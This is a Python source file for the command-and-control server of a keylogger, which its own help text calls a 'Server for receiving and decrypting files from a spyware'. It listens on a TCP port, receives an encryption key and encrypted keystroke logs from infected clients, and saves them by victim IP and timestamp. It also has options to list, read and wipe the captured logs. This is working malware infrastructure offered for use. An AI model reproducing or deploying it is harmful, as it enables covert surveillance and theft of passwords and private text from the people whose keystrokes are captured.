import socket
from cryptography.fernet import Fernet
import datetime
import os
import traceback
import argparse
class Server :

    def receive_and_decrypt_file(self,server_port):
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind(("0.0.0.0", server_port))
            server_socket.listen(1)

            print(f"Server listening on port {server_port}")

            client_socket, client_address = server_socket.accept()
            print(f"Connection from {client_address}")

            # Receive the key first
            key = client_socket.recv(1024)

            cipher_suite = Fernet(key)

            # Receive encrypted text
            encrypted_text = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                encrypted_text += chunk

            # Decrypt the text
            decrypted_text = cipher_suite.decrypt(encrypted_text)

            # Create a directory named "Fichier" if it doesn't exist
            directory = "Fichier"
            os.makedirs(directory, exist_ok=True)

            # Create a filename based on client IP and current date-time within the "Fichier" directory
            ip_personne = client_address[0]
            filename = os.path.join(directory, f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt")

            with open(filename, "wb") as file:
                file.write(decrypted_text)

            print(f"File received, decrypted, and saved as {filename} successfully.")

        except Exception as e:
            print("An error occurred:")
            traceback.print_exc()
            print(f"Error message: {e}")
        finally:
            server_socket.close()

    def show_files(self):
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            if files:
                print("List of received files:")
                for file in files:
                    print(file)
            else:
                print("No files received yet.")
        else:
            print("No files received yet.")

    def read_file(self,file_name):
        directory = "Fichier"
        file_path = os.path.join(directory, file_name)
        if os.path.exists(file_path):
            with open(file_path, "rb") as file:
                content = file.read()
                print(f"Content of file {file_name}:\n{content.decode('utf-8')}")
        else:
            print(f"File {file_name} not found.")

    def kill_server(self):
        directory = "Fichier"
        if os.path.exists(directory):
            files = os.listdir(directory)
            for file in files:
                file_path = os.path.join(directory, file)
                os.remove(file_path)
            print("All files removed.")
        else:
            print("No files to remove.")

    def menu(self):
        parser = argparse.ArgumentParser(description="Server for receiving and decrypting files from a spyware.")
        parser.add_argument("-l", "--listen", type=int, help="Listen on the specified TCP port")
        parser.add_argument("-s", "--show", action="store_true", help="Show the list of received files")
        parser.add_argument("-r", "--readfile", help="Read the content of the specified file")
        parser.add_argument("-k", "--kill", action="store_true", help="Kill all running server instances and delete received files")

        args = parser.parse_args()

        if args.listen:
            self.receive_and_decrypt_file(args.listen)
        elif args.show:
            self.show_files()
        elif args.readfile:
            self.read_file(args.readfile)
        elif args.kill:
            self.kill_server()
        else:
            parser.print_help()

if __name__ == "__main__":
    server = Server()
    server.menu()
